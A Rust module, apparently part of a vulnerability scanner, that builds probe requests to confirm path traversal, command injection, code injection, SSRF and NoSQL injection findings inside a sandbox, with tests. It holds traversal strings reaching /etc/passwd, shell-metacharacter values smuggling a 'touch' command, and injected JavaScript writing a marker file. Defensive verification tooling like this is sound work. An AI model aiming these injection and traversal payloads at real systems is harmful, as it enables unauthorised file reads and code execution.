//! The concrete requests a [`Probe`] turns into, and how a reproduction is recognized. Pure: the
//! sandbox ([`super::sandbox`]) sends these and reports back what it observed, and
//! [`reproduced`] decides. A payload only ever makes a benign, self-identifying signal — read a
//! planted marker file, write a marker file, or call a marker service — so a hit is unambiguous
//! and leaves nothing behind but the marker.

use super::plan::{Entry, Probe};
use jss_core::VulnClass;

/// The network alias the sandbox gives the marker service. An outbound request aimed here reaches
/// the marker; kept in one place so the host-only SSRF payload and [`Canary::service_url`] agree.
pub const MARKER_HOST: &str = "jss-marker";

/// Extensions commonly appended to a tainted file path before the read, plus the empty string for
/// the raw name. The canary is planted under each so a traversal through a handler that appends one
/// of these still reads the token. Not tied to any one target: these are the ordinary extensions a
/// content/download handler suffixes.
pub const PLANTED_SUFFIXES: &[&str] = &[
    "", ".md", ".json", ".html", ".htm", ".txt", ".js", ".yml", ".yaml", ".xml", ".csv",
];

/// A per-run marker. Everything a payload does is tagged with `token`, so a reproduction is told
/// from the app's normal behavior by the token alone.
#[derive(Debug, Clone)]
pub struct Canary {
    pub token: String,
    callback_host: Option<String>,
}

impl Canary {
    pub fn new(token: String) -> Self {
        Self {
            token,
            callback_host: None,
        }
    }

    /// Use a registered public callback host while the target remains on the isolated verifier
    /// network. The host must be a short-lived Satori callback token, never an arbitrary URL.
    pub fn with_callback_host(mut self, host: Option<String>) -> Self {
        self.callback_host = host;
        self
    }

    pub fn marker_host(&self) -> &str {
        self.callback_host.as_deref().unwrap_or(MARKER_HOST)
    }

    pub fn callback_host(&self) -> Option<&str> {
        self.callback_host.as_deref()
    }

    /// The file planted in the image for a read to find, holding the secret token. Its path is
    /// deliberately independent of the token: an endpoint that merely reflects the requested
    /// URL must never satisfy the read proof.
    pub fn planted_file(&self) -> String {
        "/jss-canary-read".to_owned()
    }

    /// Every path the canary is planted at: the bare file and one per extension a handler commonly
    /// appends to a tainted path before the read (`input + '.md'`, `input + '.json'`). The payload
    /// always asks for the bare name; a handler that appends a known extension then reads
    /// `<canary><ext>`, which holds the same token, so a genuine traversal still proves itself.
    pub fn planted_files(&self) -> Vec<String> {
        let base = self.planted_file();
        PLANTED_SUFFIXES
            .iter()
            .map(|suffix| format!("{base}{suffix}"))
            .collect()
    }

    /// The file a write-payload is asked to create, tagged with the probe's `nonce` so one
    /// probe's hit never confirms another's.
    pub fn written_file(&self, nonce: u32) -> String {
        format!("/tmp/jss-hit-{}-{nonce}", self.token)
    }

    /// The token a request-payload carries to the marker service for this probe.
    pub fn service_token(&self, nonce: u32) -> String {
        format!("{}-{nonce}", self.token)
    }

    /// The marker service URL a request-payload is aimed at, carrying the probe's token in its
    /// path. The sandbox runs the service on the app's private network under `jss-marker`.
    pub fn service_url(&self, nonce: u32) -> String {
        format!(
            "http://{}/{}",
            self.marker_host(),
            self.service_token(nonce)
        )
    }
}

/// How a hit is observed, out of band from the HTTP response.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Signal {
    /// The token appears in the HTTP response body (a planted file was read back).
    InResponse,
    /// Known file contents appear in the response body. Used only inside the disposable Linux
    /// verifier container to prove a traversal can read outside the application tree.
    ResponseContains(String),
    /// A file at this path now exists in the app container (a write-payload ran).
    FileWritten(String),
    /// The marker service was reached carrying this token (a request-payload ran). The sandbox
    /// looks for it in the service's log.
    ServiceReached(String),
}

/// One request to send: the verb, the path (query already appended), optional JSON body, extra
/// headers, and the signal that would confirm it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Attempt {
    pub verb: &'static str,
    pub target: String,
    pub body: Option<String>,
    pub headers: Vec<(String, String)>,
    pub signal: Signal,
}

/// Every request worth sending for a probe. Several payloads per finding (an unknown directory
/// depth, URL-encoded separators, different metacharacters), each self-contained.
pub fn attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
    let verb = probe.method.verb(&probe.entry);
    payloads(probe.class, canary, nonce)
        .into_iter()
        .flat_map(|(value, signal)| {
            if let Entry::Header(name) = &probe.entry
                && probe.class == VulnClass::Ssrf
            {
                // A tainted header that reaches an outbound request has two shapes: the whole
                // value is the URL (`fetch(req.headers['x'])`), or the value is only the
                // destination host of a fixed-scheme/port request (`http.request({ host })`). Send
                // both — the full marker URL as the header, and, as a host, the marker alias with
                // the probe token in the route path the handler forwards onward. Either one that
                // lands at the marker confirms the SSRF.
                let as_url = place(probe, verb, &value, signal.clone());
                let token = canary.service_token(nonce);
                let as_host = Attempt {
                    verb,
                    target: route_with_token(&probe.path, &token),
                    body: None,
                    headers: vec![(name.clone(), canary.marker_host().to_owned())],
                    signal: Signal::ServiceReached(token),
                };
                return vec![as_url, as_host];
            }
            if let Entry::PathParam(name) = &probe.entry
                && value.contains('/')
            {
                // A route parameter usually matches one path segment (`/media/:url`), so a value
                // with a literal `/` never reaches the handler. Send it also as one segment, `/`
                // percent-encoded; the router decodes it back before the handler reads it. The
                // literal form stays first for multi-segment (wildcard) parameters.
                let attempt = place(probe, verb, &value, signal);
                let segment = attempt.target_with(name, &probe.path, &encode_segment(&value));
                return vec![
                    attempt.clone(),
                    Attempt {
                        target: segment,
                        ..attempt
                    },
                ];
            }
            if probe.entry == Entry::Url && probe.class == VulnClass::Ssrf {
                // An upgrade entry (`server.on('upgrade', ...)`) forwards the request URL too, but
                // reaches only through an HTTP upgrade request, and often only for paths it
                // recognizes. Send the marker URL as an absolute-form upgrade target: bare, and
                // under each gate path the handler accepts, with the token carried onward either as
                // a sub-path (for `startsWith` gates) or in the query (for exact-match gates).
                if probe.method.is_upgrade() {
                    let token = canary.service_token(nonce);
                    let headers = vec![
                        ("Connection".to_owned(), "Upgrade".to_owned()),
                        ("Upgrade".to_owned(), "websocket".to_owned()),
                    ];
                    let upgrade = |target: String| Attempt {
                        verb,
                        target,
                        body: None,
                        headers: headers.clone(),
                        signal: signal.clone(),
                    };
                    let mut out = vec![upgrade(value.clone())];
                    for gate in &probe.gate_paths {
                        let gate = gate.trim_end_matches('/');
                        out.push(upgrade(format!(
                            "http://{}{gate}/{token}",
                            canary.marker_host()
                        )));
                        out.push(upgrade(format!(
                            "http://{}{gate}?jss={token}",
                            canary.marker_host()
                        )));
                    }
                    return out;
                }
                // The request target itself reaches an outbound request
                // (`new URL(req.url, base)`, a forward proxy). HTTP lets a client send it in
                // absolute form (`GET http://host/path HTTP/1.1`, RFC 9112 §3.2.2), and a URL
                // resolved against a base then keeps the client's host. Send the marker URL that
                // way too; the path form stays first for a handler that appends the path to a
                // URL of its own.
                let as_path = place(probe, verb, &value, signal);
                let absolute = Attempt {
                    target: value.clone(),
                    ..as_path.clone()
                };
                return vec![as_path, absolute];
            }
            if !matches!(probe.entry, Entry::Body(None)) {
                return vec![place(probe, verb, &value, signal)];
            }
            let mut entries = vec![Entry::Body(None)];
            entries.extend(
                body_fields(probe.class)
                    .iter()
                    .map(|field| Entry::Body(Some((*field).to_owned()))),
            );
            entries
                .into_iter()
                .flat_map(|entry| {
                    let mut candidate = probe.clone();
                    candidate.entry = entry.clone();
                    let attempt = place(&candidate, verb, &value, signal.clone());
                    let mut variants = vec![attempt.clone()];
                    if probe.class == VulnClass::Ssrf
                        && matches!(entry, Entry::Body(Some(ref field)) if field == "url")
                    {
                        variants.push(Attempt {
                            body: Some(json_object_with_field(
                                "url",
                                &value,
                                "filepath",
                                "jsspector-placeholder",
                            )),
                            ..attempt
                        });
                    }
                    variants
                })
                .collect()
        })
        .collect()
}

/// Three otherwise-identical NoSQL requests: one match-all operator and two independent
/// match-none controls. Only a database interpreting the object as an operator should make the
/// first response differ while both controls agree.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NosqlCase {
    pub field: String,
    pub match_all: Attempt,
    pub match_none_eq: Attempt,
    pub match_none_in: Attempt,
}

const NOSQL_FIELDS: [&str; 15] = [
    "id", "_id", "user", "userId", "user_id", "username", "email", "login", "uid", "name",
    "handle", "token", "key", "slug", "account",
];

pub fn nosql_cases(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<NosqlCase> {
    let verb = probe.method.verb(&Entry::Body(None));
    let absent = format!("jssnomatch{}{nonce}", canary.token);
    NOSQL_FIELDS
        .iter()
        .map(|field| {
            let body = |operator: String| Attempt {
                verb,
                target: fill_remaining(&probe.path),
                body: Some(format!("{{\"{}\":{operator}}}", json_escape(field))),
                headers: vec![("Content-Type".to_owned(), "application/json".to_owned())],
                signal: Signal::InResponse,
            };
            NosqlCase {
                field: (*field).to_owned(),
                match_all: body(format!("{{\"$ne\":\"{}\"}}", json_escape(&absent))),
                match_none_eq: body(format!("{{\"$eq\":\"{}\"}}", json_escape(&absent))),
                match_none_in: body("{\"$in\":[]}".to_owned()),
            }
        })
        .collect()
}

pub fn nosql_reproduced(match_all: &str, match_none_eq: &str, match_none_in: &str) -> bool {
    match_none_eq == match_none_in && match_all != match_none_eq && !match_all.trim().is_empty()
}

fn body_fields(class: VulnClass) -> &'static [&'static str] {
    match class {
        VulnClass::Ssrf => &["url", "uri", "host", "endpoint", "target", "callback"],
        VulnClass::PathTraversal => &["path", "file", "filename", "name"],
        VulnClass::CommandInjection => &["command", "cmd", "input", "host"],
        VulnClass::CodeInjection => &["code", "script", "input"],
        _ => &[],
    }
}

/// The payload strings for a class, each with the signal it would trip. A read-marker payload is
/// confirmed in the response; a write- or call-marker payload, out of band.
fn payloads(class: VulnClass, canary: &Canary, nonce: u32) -> Vec<(String, Signal)> {
    match class {
        VulnClass::PathTraversal => {
            let file = canary.planted_file();
            let name = file.trim_start_matches('/');
            // First prove an unmistakable OS-file read in the disposable Linux container. Keep
            // the canary variants as a fallback for applications that reject `/etc/passwd` by
            // name but still allow traversal outside their intended root.
            let passwd = "etc/passwd";
            let passwd_signal = Signal::ResponseContains("root:x:0:0:root:".to_owned());
            let mut out = vec![
                (format!("/{passwd}"), passwd_signal.clone()),
                (file.clone(), Signal::InResponse),
                (format!("/{name}"), Signal::InResponse),
            ];
            for depth in [1usize, 3, 6, 10] {
                let up = "../".repeat(depth);
                out.push((format!("{up}{passwd}"), passwd_signal.clone()));
                out.push((
                    format!("{}etc%2fpasswd", "..%2f".repeat(depth)),
                    passwd_signal.clone(),
                ));
                out.push((format!("{up}{name}"), Signal::InResponse));
                out.push((
                    format!("{}{name}", "..%2f".repeat(depth)),
                    Signal::InResponse,
                ));
            }
            out
        }
        VulnClass::CommandInjection => {
            // A benign write of the marker file, reached through the metacharacters a shell
            // honors: separators, a pipe, a subshell, a newline.
            let hit = canary.written_file(nonce);
            let w = format!("touch {hit}");
            let signal = Signal::FileWritten(hit);
            [
                format!("x; {w}"),
                format!("x| {w}"),
                format!("x`{w}`"),
                format!("x$({w})"),
                format!("x\n{w}"),
                format!("$({w})"),
            ]
            .into_iter()
            .map(|value| (value, signal.clone()))
            .collect()
        }
        VulnClass::CodeInjection => {
            // JavaScript that writes the marker file if the value is evaluated or required as a
            // module specifier that resolves to an expression context.
            let hit = canary.written_file(nonce);
            let js = format!("require('fs').writeFileSync('{hit}','1')");
            let signal = Signal::FileWritten(hit);
            [
                format!("');{js};//"),
                format!("\");{js};//"),
                format!(";{js};"),
                js,
            ]
            .into_iter()
            .map(|value| (value, signal.clone()))
            .collect()
        }
        VulnClass::Ssrf => {
            // Point the request at the marker service; a reachable hit is the signal.
            vec![(
                canary.service_url(nonce),
                Signal::ServiceReached(canary.service_token(nonce)),
            )]
        }
        _ => Vec::new(),
    }
}

/// Puts `value` where the probe said it enters, returning the full request.
fn place(probe: &Probe, verb: &'static str, value: &str, signal: Signal) -> Attempt {
    let mut target = probe.path.clone();
    let mut body = None;
    let mut headers = Vec::new();
    match &probe.entry {
        Entry::Query(name) => {
            let sep = if target.contains('?') { '&' } else { '?' };
            target = format!("{target}{sep}{}={}", encode(name), encode(value));
            // The other query parameters the handler requires alongside this one.
            for (key, val) in &probe.siblings {
                target = format!("{target}&{}={}", encode(key), encode(val));
            }
        }
        Entry::Body(name) => {
            body = Some(match name {
                // The field under test, plus the other body fields the handler requires.
                Some(field) => json_object_fields(field, value, &probe.siblings),
                None => json_string(value),
            });
            headers.push(("Content-Type".to_owned(), "application/json".to_owned()));
        }
        Entry::PathParam(name) => {
            target = target.replace(&format!("{{{name}}}"), &encode_path(value));
        }
        Entry::Header(name) => headers.push((name.clone(), header_safe(value))),
        Entry::Url => {
            // The payload is the path. Keep a single leading slash.
            target = format!("/{}", value.trim_start_matches('/'));
        }
    }
    // Any unfilled `{param}` slot gets a placeholder, so the route still matches.
    target = fill_remaining(&target);
    Attempt {
        verb,
        target,
        body,
        headers,
        signal,
    }
}

/// Did the app reproduce the finding, given what the sandbox observed for one attempt: the
/// response body, whether the written-marker file appeared, and whether the marker service was
/// reached.
pub fn reproduced(
    attempt: &Attempt,
    canary: &Canary,
    response_body: &str,
    marker_file_exists: bool,
    service_reached: bool,
) -> bool {
    match &attempt.signal {
        Signal::InResponse => response_body.contains(&canary.token),
        Signal::ResponseContains(expected) => response_body.contains(expected),
        Signal::FileWritten(_) => marker_file_exists,
        Signal::ServiceReached(_) => service_reached,
    }
}

/// The route with its first `{param}` slot carrying `token` (so a handler that forwards the
/// request path onward carries the token to the marker) and any other slot filled with a
/// placeholder. A route with no slot is returned unchanged — the token cannot ride a fixed path,
/// and that attempt simply will not reproduce. `token` is alphanumeric with `-`, safe in a path
/// segment unencoded.
fn route_with_token(route: &str, token: &str) -> String {
    let filled = match (route.find('{'), route.find('}')) {
        (Some(start), Some(_)) => match route[start..].find('}').map(|end| start + end) {
            Some(end) => format!("{}{}{}", &route[..start], token, &route[end + 1..]),
            None => route.to_owned(),
        },
        _ => route.to_owned(),
    };
    fill_remaining(&filled)
}

/// Fills any remaining `{name}` route slot with a harmless placeholder so the path matches.
fn fill_remaining(path: &str) -> String {
    let mut out = String::with_capacity(path.len());
    let mut rest = path;
    while let Some(open) = rest.find('{') {
        out.push_str(&rest[..open]);
        match rest[open..].find('}') {
            Some(close) => {
                out.push('1');
                rest = &rest[open + close + 1..];
            }
            None => {
                out.push_str(&rest[open..]);
                return out;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Minimal percent-encoding for a query key or value: everything but the unreserved set, and the
/// payload's own `/` and `.` kept readable where they are already safe in a query.
fn encode(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for byte in text.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char);
            }
            other => out.push_str(&format!("%{other:02X}")),
        }
    }
    out
}

impl Attempt {
    /// The probe's route with the `{name}` slot filled by an already-encoded `encoded` value and
    /// any other slot given a placeholder, as [`place`] does.
    fn target_with(&self, name: &str, route: &str, encoded: &str) -> String {
        fill_remaining(&route.replace(&format!("{{{name}}}"), encoded))
    }
}

/// Encoding for a value that must stay one path segment: everything but RFC 3986 unreserved
/// characters is percent-encoded, `/` included.
fn encode_segment(text: &str) -> String {
    let mut out = String::with_capacity(text.len() * 3);
    for byte in text.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~') {
            out.push(byte as char);
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    out
}

/// Encoding for a value placed in a path segment: keep `/` and `.` so traversal reaches the
/// sink, encode the rest of what a URL forbids.
fn encode_path(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for byte in text.bytes() {
        match byte {
            b' ' => out.push_str("%20"),
            b'#' | b'?' | b'%' => out.push_str(&format!("%{byte:02X}")),
            other => out.push(other as char),
        }
    }
    out
}

/// Strips CR/LF from a header value (no request splitting); the payload itself carries no
/// newline for a header entry.
fn header_safe(text: &str) -> String {
    text.chars().filter(|c| *c != '\r' && *c != '\n').collect()
}

fn json_string(value: &str) -> String {
    format!("\"{}\"", json_escape(value))
}

fn json_object(field: &str, value: &str) -> String {
    format!("{{\"{}\":\"{}\"}}", json_escape(field), json_escape(value))
}

/// A JSON object of the field under test plus any sibling body fields (skipping any that would
/// duplicate the field under test).
fn json_object_fields(field: &str, value: &str, siblings: &[(String, String)]) -> String {
    let base = json_object(field, value);
    let extra: Vec<&(String, String)> = siblings.iter().filter(|(key, _)| key != field).collect();
    if extra.is_empty() {
        return base;
    }
    let mut out = base.trim_end_matches('}').to_owned();
    for (key, val) in extra {
        out.push_str(&format!(
            ",\"{}\":\"{}\"",
            json_escape(key),
            json_escape(val)
        ));
    }
    out.push('}');
    out
}

fn json_object_with_field(field: &str, value: &str, other: &str, other_value: &str) -> String {
    format!(
        "{{\"{}\":\"{}\",\"{}\":\"{}\"}}",
        json_escape(field),
        json_escape(value),
        json_escape(other),
        json_escape(other_value)
    )
}

fn json_escape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            other => out.push(other),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::super::plan::{Entry, Method, Probe};
    use super::*;

    fn probe(class: VulnClass, path: &str, entry: Entry) -> Probe {
        Probe {
            method: Method::Get,
            path: path.to_owned(),
            entry,
            class,
            siblings: Vec::new(),
            gate_paths: Vec::new(),
        }
    }

    #[test]
    fn a_query_traversal_climbs_from_several_depths() {
        let canary = Canary::new("abc123".to_owned());
        let a = attempts(
            &probe(
                VulnClass::PathTraversal,
                "/api/files",
                Entry::Query("name".to_owned()),
            ),
            &canary,
            0,
        );
        assert!(a.iter().all(|x| x.target.starts_with("/api/files?name=")));
        assert!(a.iter().any(|x| {
            matches!(&x.signal, Signal::ResponseContains(expected)
                if expected == "root:x:0:0:root:")
                && x.target.contains("etc")
                && x.target.contains("passwd")
        }));
        // The canary secret is content only. Echoing a requested URL cannot verify the read.
        assert!(a.iter().all(|x| !x.target.contains("abc123")));
        assert!(a.len() >= 4);
    }

    #[test]
    fn a_body_ssrf_targets_the_marker_service() {
        let canary = Canary::new("tok".to_owned());
        let a = attempts(
            &probe(
                VulnClass::Ssrf,
                "/fetch",
                Entry::Body(Some("url".to_owned())),
            ),
            &canary,
            0,
        );
        assert_eq!(a.len(), 1);
        assert_eq!(a[0].signal, Signal::ServiceReached("tok-0".to_owned()));
        assert_eq!(
            a[0].body.as_deref(),
            Some("{\"url\":\"http://jss-marker/tok-0\"}")
        );
    }

    #[test]
    fn a_registered_callback_replaces_the_private_marker_hostname() {
        let host = format!("{}.callback.satori.ci", "a".repeat(32));
        let canary = Canary::new("run".to_owned()).with_callback_host(Some(host.clone()));
        assert_eq!(canary.marker_host(), host);
        assert_eq!(canary.service_url(2), format!("http://{host}/run-2"));
    }

    #[test]
    fn a_header_ssrf_tries_the_url_and_the_host_shapes() {
        // The header may carry a whole URL, or just the destination host of a fixed-port request.
        let canary = Canary::new("tok".to_owned());
        let a = attempts(
            &probe(
                VulnClass::Ssrf,
                "/{any}",
                Entry::Header("wx-host".to_owned()),
            ),
            &canary,
            2,
        );
        assert_eq!(a.len(), 2);
        // URL shape: the full marker URL as the header value, route path a placeholder.
        assert_eq!(
            a[0].headers,
            vec![("wx-host".to_owned(), "http://jss-marker/tok-2".to_owned())]
        );
        // Host shape: the bare marker host as the header, the probe token riding the forwarded
        // route path.
        assert_eq!(
            a[1].headers,
            vec![("wx-host".to_owned(), "jss-marker".to_owned())]
        );
        assert_eq!(a[1].target, "/tok-2");
        assert!(
            a.iter()
                .all(|x| x.signal == Signal::ServiceReached("tok-2".to_owned()))
        );
    }

    #[test]
    fn an_unnamed_body_tries_likely_fields() {
        let canary = Canary::new("tok".to_owned());
        let a = attempts(
            &probe(VulnClass::Ssrf, "/fetch", Entry::Body(None)),
            &canary,
            0,
        );
        assert_eq!(a.len(), 8);
        assert_eq!(a[0].body.as_deref(), Some("\"http://jss-marker/tok-0\""));
        assert!(a.iter().any(|attempt| {
            attempt.body.as_deref() == Some("{\"url\":\"http://jss-marker/tok-0\"}")
        }));
        assert!(a.iter().any(|attempt| {
            attempt.body.as_deref()
                == Some(
                    "{\"url\":\"http://jss-marker/tok-0\",\"filepath\":\"jsspector-placeholder\"}",
                )
        }));
    }

    #[test]
    fn a_command_injection_writes_the_marker_file() {
        let canary = Canary::new("t".to_owned());
        let a = attempts(
            &probe(
                VulnClass::CommandInjection,
                "/run",
                Entry::Query("host".to_owned()),
            ),
            &canary,
            0,
        );
        assert!(
            a.iter().all(
                |x| matches!(&x.signal, Signal::FileWritten(f) if f == &canary.written_file(0))
            )
        );
        assert!(a.len() >= 4);
    }

    #[test]
    fn a_path_param_fills_its_slot() {
        let canary = Canary::new("z".to_owned());
        let a = attempts(
            &probe(
                VulnClass::PathTraversal,
                "/barcode/{key}",
                Entry::PathParam("key".to_owned()),
            ),
            &canary,
            0,
        );
        assert!(a.iter().all(|x| x.target.starts_with("/barcode/")));
        assert!(a.iter().all(|x| !x.target.contains("{key}")));
    }

    #[test]
    fn a_path_param_ssrf_url_is_also_sent_as_one_encoded_segment() {
        let canary = Canary::new("s".to_owned());
        let a = attempts(
            &probe(
                VulnClass::Ssrf,
                "/media/{url}",
                Entry::PathParam("url".to_owned()),
            ),
            &canary,
            3,
        );
        let url = canary.service_url(3);
        assert_eq!(a.len(), 2);
        assert_eq!(a[0].target, format!("/media/{url}"));
        assert_eq!(
            a[1].target,
            format!("/media/{}", url.replace(':', "%3A").replace('/', "%2F"))
        );
        assert!(
            a.iter()
                .all(|x| x.signal == Signal::ServiceReached(canary.service_token(3)))
        );
    }

    #[test]
    fn a_catch_all_url_becomes_the_path() {
        let canary = Canary::new("w".to_owned());
        let a = attempts(
            &probe(VulnClass::PathTraversal, "/{wildcard}", Entry::Url),
            &canary,
            0,
        );
        assert!(a.iter().all(|x| x.target.starts_with('/')));
        assert!(a.iter().all(|x| !x.target.contains("{wildcard}")));
    }

    /// An SSRF through the request target itself (`new URL(req.url, base)`): the marker URL as a
    /// path, then as an absolute-form request target, both tied to the probe's own token.
    #[test]
    fn a_url_ssrf_is_also_sent_as_an_absolute_form_target() {
        let canary = Canary::new("u".to_owned());
        let a = attempts(
            &probe(VulnClass::Ssrf, "/{wildcard}", Entry::Url),
            &canary,
            4,
        );
        let url = canary.service_url(4);
        let targets: Vec<&str> = a.iter().map(|x| x.target.as_str()).collect();
        assert_eq!(targets, [format!("/{url}"), url.clone()]);
        assert!(a.iter().all(|x| x.verb == "GET" && x.body.is_none()));
        assert!(
            a.iter()
                .all(|x| x.signal == Signal::ServiceReached(canary.service_token(4)))
        );
        // Other classes through the URL keep the path form only.
        let traversal = attempts(
            &probe(VulnClass::PathTraversal, "/{wildcard}", Entry::Url),
            &canary,
            4,
        );
        assert!(traversal.iter().all(|x| x.target.starts_with('/')));
    }

    #[test]
    fn nosql_cases_place_matching_operators_in_the_body() {
        let canary = Canary::new("tok".to_owned());
        let cases = nosql_cases(
            &probe(VulnClass::NosqlInjection, "/api/user", Entry::Body(None)),
            &canary,
            1,
        );
        assert_eq!(cases.len(), NOSQL_FIELDS.len());
        let id = cases.iter().find(|case| case.field == "id").unwrap();
        assert_eq!(
            id.match_all.body.as_deref(),
            Some("{\"id\":{\"$ne\":\"jssnomatchtok1\"}}")
        );
        assert_eq!(
            id.match_none_eq.body.as_deref(),
            Some("{\"id\":{\"$eq\":\"jssnomatchtok1\"}}")
        );
        assert_eq!(
            id.match_none_in.body.as_deref(),
            Some("{\"id\":{\"$in\":[]}}")
        );
    }

    #[test]
    fn nosql_reproduction_needs_agreeing_controls_and_a_distinct_match_all() {
        assert!(nosql_reproduced(
            "{\"_id\":\"abc\"}",
            "{\"error\":\"not found\"}",
            "{\"error\":\"not found\"}"
        ));
        assert!(!nosql_reproduced("not found", "not found", "not found"));
        assert!(!nosql_reproduced("record", "echo $eq", "echo $in"));
        assert!(!nosql_reproduced("  ", "not found", "not found"));
    }

    #[test]
    fn reproduced_reads_the_signal() {
        let canary = Canary::new("TOKEN".to_owned());
        let in_response = Attempt {
            verb: "GET",
            target: "/x".to_owned(),
            body: None,
            headers: Vec::new(),
            signal: Signal::InResponse,
        };
        assert!(reproduced(
            &in_response,
            &canary,
            "...TOKEN...",
            false,
            false
        ));
        assert!(!reproduced(&in_response, &canary, "nothing", true, true));
        let passwd = Attempt {
            signal: Signal::ResponseContains("root:x:0:0:root:".to_owned()),
            ..in_response.clone()
        };
        assert!(reproduced(
            &passwd,
            &canary,
            "root:x:0:0:root:/root:/bin/bash",
            false,
            false
        ));
        assert!(!reproduced(
            &passwd,
            &canary,
            "/../../../etc/passwd",
            false,
            false
        ));
        let written = Attempt {
            signal: Signal::FileWritten(canary.written_file(0)),
            ..in_response.clone()
        };
        assert!(reproduced(&written, &canary, "", true, false));
        assert!(!reproduced(&written, &canary, "", false, false));
        let service = Attempt {
            signal: Signal::ServiceReached(canary.service_token(0)),
            ..in_response
        };
        assert!(reproduced(&service, &canary, "", false, true));
    }
}
